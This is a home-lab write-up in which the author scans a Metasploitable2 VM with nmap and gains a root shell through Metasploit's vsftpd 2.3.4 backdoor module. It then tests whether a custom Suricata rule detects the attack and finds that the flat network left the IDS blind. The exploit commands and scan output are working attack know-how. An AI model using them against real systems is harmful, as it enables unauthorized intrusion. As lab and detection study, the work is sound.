# Metasploitable Exploitation and Detection Analysis

## Overview

In this lab, I simulated a real attack scenario against a vulnerable system (Metasploitable2) using Kali Linux. The goal was not just to exploit the system, but to understand how vulnerabilities are identified, how exploits are chosen, and whether the attack can be detected using a network-based IDS (OPNsense with Suricata).

This lab also highlights an important concept in security: even when detection tools are present, attacks can still go unnoticed if the network is not designed correctly.

## Lab Setup

The environment consisted of four main components:

- Kali Linux (attacker)
- Metasploitable2 (target)
- OPNsense (firewall + IDS)
- Wazuh (SIEM, not used in this specific attack)

All machines were placed on the same internal network.

## Reconnaissance (Nmap Scan)

The first step was to gather information about the target system using Nmap.

Command used:

```bash
nmap -A -Pn --top-ports 500 10.200.200.50
```

Full scan output:

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -Pn --top-ports 500 10.200.200.50

Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 10.200.200.50
Host is up (0.00019s latency).
Not shown: 479 closed tcp ports (reset)

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
|_smtp-commands: metasploitable.localdomain, PIPELINING, STARTTLS
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-title: Metasploitable2 - Linux
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)

Service Info: OS: Linux (2.6.x)

Nmap done: 1 IP address (1 host up)
                                                                  
```

This scan provided detailed information about open ports, running services, and versions.

## What Was Discovered

The scan revealed that the system was running multiple outdated and exposed services. This is important because attackers do not just look for open ports — they look for specific versions that are known to be vulnerable.

Some key findings:

- FTP running vsftpd 2.3.4 with anonymous login enabled
- Samba services exposed on ports 139 and 445
- Telnet service available (insecure by design)
- UnrealIRCd running on port 6667
- Apache web server running an outdated version

At this stage, the goal is not to attack everything, but to identify the most reliable and well-known vulnerability.

## Choosing What to Exploit

The FTP service stood out immediately:

- It was running vsftpd 2.3.4
- This version is known to contain a backdoor
- It allows direct remote access without authentication

Instead of randomly trying attacks, this is a case of matching a known vulnerability to a known exploit. This is how real attackers operate.

## Exploitation with Metasploit

Metasploit was used to exploit the FTP vulnerability.

First, Metasploit was launched:

```bash
msfconsole
```

Then the exploit was searched:

```bash
search vsftpd
```

![Metasploit Search](./ msfconsole1.PNG)

The correct module was selected and configured:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 10.200.200.50
run
```

![Exploit Execution](./RCE.PNG)

## What Happened During the Exploit

The exploit did not “log in” normally. Instead, it triggered a hidden backdoor in the FTP service.

Behind the scenes:

- A specially crafted login request is sent to the FTP server
- The backdoor is triggered silently
- The target opens a shell on port 6200
- Metasploit connects to that shell

This results in a command shell being opened on the target system.

## Result of the Attack

The exploit was successful and provided root-level access to the system.

This means:

- Full control over the machine was achieved
- No authentication was required
- The system was completely compromised

This is an example of a Remote Code Execution (RCE) vulnerability.

## Attempting Detection with Suricata

To detect this behavior, a custom Suricata rule was created:

```
alert tcp any any -> any 6200 (msg:"VSFTPD BACKDOOR SHELL DETECTED"; sid:3000001; rev:1;)
```

The idea behind this rule is simple:

Port 6200 is not normally used, so any connection to it is highly suspicious and likely tied to the backdoor.

## Detection Outcome

When the exploit was executed, no alerts were generated.

However, when manually scanning the firewall using:

```bash
nmap -p 6200 10.200.200.254
```

The alert was triggered successfully.

This confirms that:
- The rule works
- Suricata is functioning correctly

## Why the Exploit Was Not Detected

The issue was not with the rule, but with the network design.

Both Kali and Metasploitable were on the same subnet. This means:

- Traffic flowed directly between the two machines
- The firewall was bypassed completely
- Suricata never saw the exploit traffic

In other words, the IDS was in place, but the traffic never reached it.

## Key Takeaway

Detection is not just about having rules — it depends on where traffic flows.

If traffic does not pass through the inspection point, it cannot be detected.

This lab clearly demonstrates how poor network segmentation can create blind spots, allowing attackers to operate without being seen.

## Lessons Learned

This exercise showed that identifying vulnerabilities is only part of the process. Understanding how systems communicate is just as important.

It also highlighted that:

- Real attacks are based on known vulnerabilities, not random attempts
- Detection tools require proper placement to be effective
- Flat networks make lateral movement easier and harder to detect
- A successful exploit does not always generate alerts

## Next Steps

To improve this lab further, the next steps would be:

- Reconfigure the network so all traffic passes through OPNsense
- Install a Wazuh agent on Metasploitable to monitor host activity
- Perform additional exploits such as Samba and UnrealIRCd
- Compare detection before and after improving visibility

This would allow the lab to demonstrate both offensive and defensive capabilities more clearly.
